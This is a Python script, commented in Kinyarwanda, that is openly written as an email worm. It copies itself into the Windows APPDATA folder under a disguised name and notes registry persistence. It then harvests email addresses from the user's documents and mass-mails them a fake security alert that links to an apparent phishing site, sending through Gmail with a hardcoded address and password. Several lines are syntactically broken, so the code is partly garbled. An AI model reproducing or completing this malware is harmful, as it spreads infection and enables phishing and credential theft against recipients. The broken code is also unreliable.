import os
import shutil
import smtplib
import re
import sys
from email.message import EmailMessage

# 1. PERSISTENCE & REPLICATION (Kwigwiza mu buryo bukomeye)
def be_strong():
    # Inzoka yikoporora mu madosiye ya sisitemu kugira ngo isibwa rigore
    worm_name = "SystemUpdate.py"
    app_data_path = os.getenv('APPDATA') # Ahantu abantu badakunze kureba
    target_path = os.path.join(app_data_path, worm_name)
    
    if not os.path.exists(target_path):
        shutil.copy(__file__, target_path)
        # Hano hashobora kongerwaho kode iyandika muri Windows Registry (Startup)
        # kugira ngo imashini yafungurwa yose inzoka itangire gukora.

# 2. ADVANCED HARVESTING (Gushakisha imeri hose mu mashini)
def get_all_targets():
    targets = set()
    # Isoma imeri mu madosiye ya Documents, Desktop, na Downloads
    search_paths = [os.path.expanduser("~") + d for d in ["/Documents", "/Desktop", "/Downloads"]]
    email_regex = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith((".txt", ".docx", ".pdf", ".html")):
                        try:
                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                emails = re.findall(email_regex, f.read())
                                targets.update(emails)
                        except: continue
    return list(targets)

# 3. STEALTHY SPREADING (Kohereza ubutumwa bushukana cyane)
def spread_stealthily(target_list):
    # Imeri y'uwohereza (Attacker)
    MY_EMAIL = "mpanobenoit8@gmail.com"
    APP_PASSWORD = "Pa55Word$" # App Password ya Google

    for victim in target_list:
        msg = EmailMessage()
        msg['Subject'] = "URGENT: casino yagarutse kuri betpawa"
        msg['From'] = f"Security Support <{mpanobenoit8@gmail.com}>"
        msg['To'] = mbaragaelie8@gmail.com
        
        # Ubutumwa bushukana (Social Engineering)
        content = f"""
        kuri elie,
        
        Twabonye ko hari umuntu wagerageje kwinjira muri konti yawe.
        Nyamuneka kanda kuri iyi link uhite uyihagarika:
        http://secure-login-verify.net
        
        Murakoze,
        Security Team.
        """
        msg.set_content(content)

        try:
            with smtplib.SMTP_SSL(':smtp@gmail.com', 465) as smtp:
                smtp.login(MY_EMAIL, APP_PASSWORD)
                smtp.send_message(msg)
        except: continue

# --- GUTANGIRA ---
if __name__ == "__main__":
    be_strong()              # Kwihishira mu madosiye ya sisitemu
    victims = get_all_targets() # Gushaka imeri zose ziri muri mudasobwa
    if victims:
        spread_stealthily(victims) # Kohereza link yanduye kuri bose
